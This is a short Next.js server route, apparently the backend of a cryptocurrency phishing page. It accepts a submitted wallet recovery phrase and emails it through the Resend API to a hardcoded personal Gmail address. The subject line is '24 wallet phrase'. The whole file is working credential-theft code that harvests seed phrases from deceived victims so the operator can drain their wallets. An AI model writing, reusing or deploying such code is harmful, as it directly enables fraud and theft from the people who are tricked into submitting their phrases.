import { Resend } from "resend";
import { NextResponse } from "next/server";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(request) {
  try {
    const { passphrase } = await request.json();

    const { data, error } = await resend.emails.send({
      from: "pi-minne <onboarding@resend.dev>",
      to: ["allenumunade@gmail.com"],
      subject: "24 wallet phrase",
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px;">
          <h2 style="color: #583A89;">Wallet Passphrase Received</h2>
          <p>A new passphrase has been submitted:</p>
          <div style="background: #f5f5f5; padding: 15px; border-radius: 5px;">
            <p style="margin: 0;">${passphrase}</p>
          </div>
          <p style="color: #666; margin-top: 20px;">Time: ${new Date().toLocaleString()}</p>
        </div>
      `,
    });

    if (error) {
      console.error("Resend error:", error);
      return NextResponse.json(
        { error: "Failed to send email" },
        { status: 500 }
      );
    }

    return NextResponse.json(
      { message: "Email sent successfully", data },
      { status: 200 }
    );
  } catch (error) {
    console.error("Server error:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}
